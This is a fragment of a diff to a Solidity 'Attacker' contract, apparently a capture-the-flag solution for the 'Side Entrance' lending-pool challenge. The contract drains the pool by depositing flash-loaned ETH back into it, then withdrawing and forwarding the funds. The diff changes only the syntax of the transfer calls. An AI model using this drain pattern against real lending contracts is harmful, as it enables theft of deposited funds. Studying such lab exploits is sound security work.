@@ -72,13 +72,13 @@ contract Attacker {
         // to deposit the flash loaned ETH into the pool.
         _pool.flashLoan( _amount);
         _pool.withdraw();
-        address(_recovery).call{value: _amount}("");
+        payable(_recovery).transfer(_amount);
     }
 
     function execute() external payable {
         // This function is called by the pool during the flash loan.
         // It deposits the flash loaned ETH into the pool.
-        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
+        SideEntranceLenderPool(payable(msg.sender)).deposit{value: msg.value}();
     }
 
     receive() external payable {
